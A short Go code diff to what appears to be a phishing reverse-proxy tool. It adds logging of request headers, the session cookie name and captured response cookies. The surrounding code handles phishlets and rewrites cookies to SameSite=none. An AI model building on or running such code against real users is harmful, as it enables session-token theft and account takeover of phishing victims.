@@ -156,6 +156,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 	p.Proxy.OnRequest().
 		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
+			log.Info("Request Headers: %v", req.Header)
+
 			ps := &ProxySession{
 				SessionId:    "",
 				Created:      false,
@@ -295,7 +297,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					ps.PhishletName = pl_name
 				}
 				session_cookie := getSessionCookieName(pl_name, p.cookieName)
-
+                                log.Important("Session cookie name: %s", session_cookie)
+				
 				ps.PhishDomain = phishDomain
 				req_ok := false
 				// handle session
@@ -954,6 +957,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			resp.Header.Del("Set-Cookie")
 			for _, ck := range cookies {
 				// parse cookie
+                                log.Debug("Resp Cookies: %s", cookies)
 
 				// add SameSite=none for every received cookie, allowing cookies through iframes
 				if ck.Secure {
